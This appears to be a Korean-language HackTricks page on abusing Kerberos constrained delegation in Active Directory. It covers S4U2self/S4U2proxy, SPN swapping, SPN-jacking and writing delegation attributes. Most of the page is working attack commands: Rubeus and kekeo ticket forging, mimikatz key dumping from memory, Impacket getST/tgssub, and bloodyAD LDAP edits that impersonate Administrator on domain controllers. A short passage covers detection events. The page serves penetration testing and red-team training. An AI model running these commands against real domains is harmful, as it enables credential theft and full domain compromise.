# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

이를 사용하면 Domain admin이 컴퓨터가 임의의 머신에서 **어떤 서비스든** 대상으로 **사용자나 컴퓨터를 가장**하도록 **허용**할 수 있습니다.

- **Service for User to self (_S4U2self_):** **SPN을 소유한 서비스 계정**은 일반적으로 임의의 사용자를 대신해 자기 자신에게 TGS를 발급받을 수 있습니다. 계정의 _userAccountControl_에 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D)도 설정되어 있으면 해당 TGS는 **forwardable**입니다. 이 때문에 프로토콜 전환을 **classic constrained delegation**에 직접 유용하게 사용할 수 있습니다.
- **Service for User to Proxy(_S4U2proxy_):** **서비스 계정**은 **msDS-AllowedToDelegateTo**에 나열된 SPN에 대해 사용자를 대신하는 TGS를 발급받을 수 있습니다. S4U2Proxy에서 사용하는 증거 티켓은 위임하는 서비스에 대한 **forwardable** 티켓이어야 합니다. 즉, 피해자에게서 캡처한 실제 클라이언트-서비스 티켓이거나 **S4U2Self + T2A4D**로 생성한 티켓이어야 합니다.

**참고**: AD에서 사용자가 ‘_Account is sensitive and cannot be delegated_’로 표시되어 있거나 **Protected Users**의 구성원이라면, 일반적으로 constrained delegation을 통해 해당 사용자를 **가장할 수 없습니다**. 최신 도메인에서 delegation이 활성화된 계정을 대상으로 할 때는 RC4만 가능하다고 가정하기보다 **AES** 자료를 우선 사용하세요.

즉, **서비스의 해시를 탈취하면** 사용자를 **가장**해 해당 사용자 대신 지정된 머신의 **서비스**에 **접근**할 수 있습니다(**privesc** 가능).

또한, 사용자가 가장할 수 있는 서비스에만 접근할 수 있는 것이 아니라 **다른 서비스에도 접근할 수 있습니다**. SPN(요청된 서비스 이름)은 티켓에서 검사되지 않기 때문입니다(티켓에서 이 부분은 암호화되거나 서명되지 않습니다). 따라서 **CIFS 서비스**에 접근할 수 있다면, 예를 들어 Rubeus의 `/altservice` 플래그를 사용해 **HOST 서비스**에도 접근할 수 있습니다. 같은 SPN 교체 취약점은 **Impacket getST -altservice** 및 다른 도구에서도 악용됩니다.

또한 DC의 **LDAP 서비스에 대한 접근 권한**은 **DCSync**를 악용하는 데 필요합니다.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**운영자 참고:** **gMSA/sMSA** 검토 시 **ADUC** 또는 BloodHound 스크린샷만 믿지 마세요. 이러한 계정에는 일반적인 Delegation 탭이 표시되지 않는 경우가 많으므로, **`userAccountControl`** 및 **`msDS-AllowedToDelegateTo`** raw attribute를 직접 열거하세요.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-transition과 Kerberos-only constrained delegation 비교

손상된 계정에 **T2A4D**가 있으면, 보통 서비스 키/TGT만으로 전체 **`S4U2Self -> S4U2Proxy`** 체인을 완료할 수 있습니다.<sup>[[2]](#references)</sup>

**`msDS-AllowedToDelegateTo`**만 있는 경우(기존의 **"Use Kerberos only"** 모드)에도 delegation을 악용할 수는 있지만, S4U2Proxy의 evidence ticket은 위임하는 서비스에 대한 **forwardable user-to-service ticket**이어야 합니다. 한 가지 방법은 **LSASS/ccache**에서 victim TGS를 캡처해 두 번째 단계에 전달하는 것입니다(Rubeus의 `/tgs:`). **non-forwardable** S4U2Self ticket은 기존 constrained delegation에 **충분하지 않습니다**. 이것이 보유한 유일한 evidence ticket이라면 대신 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)을 확인하세요.<sup>[[2]](#references)</sup>

또 다른 조건부 방법은 위임하는 서비스로 가는 첫 번째 [RBCD](resource-based-constrained-delegation.md) hop입니다. 이 단계에서 의도한 user와 service에 대한 **forwardable** ticket이 생성되면, 해당 ticket을 이후 Kerberos-only S4U2Proxy hop의 evidence로 사용할 수 있는지 테스트할 수 있습니다. 첫 번째 ticket의 flags, 위임하는 서비스의 SPN, 해당 서비스의 target allow-list, user delegation restrictions를 확인하세요. RBCD attribute를 제어할 수 있다는 사실만으로 두 번째 hop까지 가능하다고 볼 수는 없습니다.

### Cross-domain constrained delegation 관련 참고 사항 (2025+)

**Windows Server 2012/2012 R2**부터 KDC는 S4U2Proxy extensions를 통해 **도메인/포리스트 간 constrained delegation**을 지원합니다. 최신 빌드(Windows Server 2016–2025)에서도 이 동작은 유지되며, protocol transition을 나타내는 PAC SID 두 개가 추가되었습니다:<sup>[[1]](#references)</sup>

- 사용자가 정상적으로 인증한 경우 `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**).
- 서비스가 protocol transition을 통해 identity를 주장한 경우 `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**).

도메인 간에 protocol transition을 사용하면 PAC에 `SERVICE_ASSERTED_IDENTITY`가 포함될 것으로 예상할 수 있습니다. 이는 S4U2Proxy 단계가 성공했음을 확인해 줍니다.<sup>[[1]](#references)</sup>

### Impacket / Linux 도구 (altservice 및 전체 S4U)

최신 Impacket(0.11.x+)은 Rubeus와 동일한 S4U 체인 및 SPN swapping을 지원합니다:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

사용자 ST를 먼저 forge하려는 경우(예: 오프라인 hash만 있는 경우), **ticketer.py**와 **getST.py**를 함께 사용해 S4U2Proxy를 수행하세요. 이미 작동하는 ccache가 있고 같은 호스트의 service class만 바꾸면 되는 경우에는 **tgssub.py**도 유용합니다. 현재 알려진 문제는 공개된 Impacket issue #1713을 참고하세요(forged ST가 SPN key와 일치하지 않으면 KRB_AP_ERR_MODIFIED가 발생함).<sup>[[2]](#references)</sup>

### SPN-jacking: constrained-delegation 대상 리디렉션

일반적인 constrained delegation은 변경할 수 없는 target SID가 아니라 `msDS-AllowedToDelegateTo`의 **SPN string**을 허용합니다. S4U2Proxy 중에 KDC는 현재 해당 SPN을 소유한 계정을 확인하고, 그 계정의 장기 key로 service ticket을 암호화합니다. 따라서 위임 계정을 제어하고 다른 service/computer 계정에 대한 `WriteSPN` 권한이 있으면 `SeEnableDelegationPrivilege` 없이도 변경되지 않은 위임 제약의 대상을 리디렉션할 수 있습니다.<sup>[[5]](#references)[[6]](#references)</sup>

두 가지 변형이 있습니다:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** 이전 소유자가 삭제되거나 이름이 변경되었거나 SPN이 제거되어 허용된 SPN에 소유자가 없습니다. 해당 SPN을 원하는 target 계정에 직접 추가합니다.
- **Live SPN-jacking:** SPN이 여전히 source 계정에 속해 있습니다. 중복 SPN 검증으로 인해 destination에 추가하는 작업이 일반적으로 차단되므로, 두 객체 모두에 대한 `WriteSPN`이 필요합니다. source에서 SPN을 제거하고 target에 추가한 다음 ticket을 얻고 원래 등록을 복원합니다.

다음은 허용된 SPN을 옮기고, 손상된 위임 principal로 S4U를 실행한 후 ticket의 service name을 새 target의 유용한 service로 다시 작성하는 추상화된 Linux 흐름입니다.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice`는 두 번째로, 별개의 primitive입니다. S4U2Proxy 티켓은 현재 `$DELEGATED_SPN`을 소유한 계정용으로 암호화되어 있습니다. 티켓 서비스 이름(`sname`)은 암호화된 티켓 본문에 포함되지 않으므로, 도구를 사용해 서비스가 동일한 계정 키를 사용하는 다른 서비스 클래스/호스트 이름으로 바꿀 수 있습니다. SPN-jacking은 먼저 티켓을 보호하는 **계정 키**를 바꾸고, 서비스 클래스 대체는 해당 티켓을 **어디에 제시할지** 바꿉니다.<sup>[[5]](#references)[[6]](#references)</sup>

실시간 jacking의 경우, 정상 서비스를 중단하지 않도록 티켓을 획득한 직후 두 LDAP 쓰기의 순서를 바꾸세요. 컴퓨터 계정 감사를 사용하도록 설정한 DC에서는 한 컴퓨터에서 `servicePrincipalName`이 제거된 뒤 다른 컴퓨터에 곧바로 추가된 Security 이벤트 **4742**를 찾아보세요. 특히 SPN 호스트 이름이 대상의 `dNSHostName`과 다르면 주의해야 합니다. 이벤트 **4769**와 상관 분석하세요. S4U2Self에서는 동일한 계정이 클라이언트/서비스로 표시되고, S4U2Proxy에서는 **Transited Services**가 채워집니다.<sup>[[5]](#references)</sup>

### 제어 가능한 계정에 delegation 구성하기

이 방법을 사용하려면 컴퓨터 또는 서비스 계정의 delegation 속성에 대한 **실질적인 쓰기 권한**(예: `GenericAll` 또는 ACL을 변경한 뒤의 `WriteDACL`)과 LDAP 변경을 수행하는 계정의 `SeEnableDelegationPrivilege` 사용자 권한이 **모두** 필요합니다. Microsoft는 `msDS-AllowedToDelegateTo`를 수정할 때 해당 권한을 요구합니다. 객체 제어 권한만으로는 이 요구 사항을 우회할 수 없습니다. **bloodyAD** 같은 LDAP 클라이언트를 사용해 protocol-transition delegation을 설정하기 전에 두 가지 사전 조건을 모두 확인하세요.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

기존 컴퓨터 계정은 `ms-DS-MachineAccountQuota`가 0인 경우에도 후보가 될 수 있습니다. 해당 할당량은 기본적인 새 컴퓨터 생성 경로를 제한할 뿐, 기존 객체에 대한 권한을 제한하지는 않습니다. 구성된 위임을 사용하려면 위임 계정의 키 또는 암호를 제어할 수 있어야 하고, 유효한 service principal name이 있어야 하며, 자격 증명을 위임할 수 있는 대상 사용자가 필요합니다. 이러한 조건과 유효한 디렉터리 액세스 권한은 각각 별도로 확인해야 합니다.

- Step 1: **허용된 서비스의 TGT 가져오기**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> SYSTEM 권한 없이도 Printer Bug 및 unconstrained delegation, NTLM relaying, Active Directory Certificate Service 악용 등의 방법으로 **TGT 티켓**이나 **RC4** 또는 **AES256**을 얻을 수 있습니다.
>
> **TGT 티켓(또는 해시)만 있으면 컴퓨터 전체를 장악하지 않고도 이 공격을 수행할 수 있습니다.**

- Step2: **사용자를 가장해 서비스용 TGS 가져오기**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**ired.team에서 더 알아보기.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos 제한 위임 개요 (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket으로 위임 악용하기 (2부): 제한 위임 (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos 제한 위임 (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: 공격자 관점의 Kerberos 개요 (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: WriteSPN 악용의 예외 사례](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
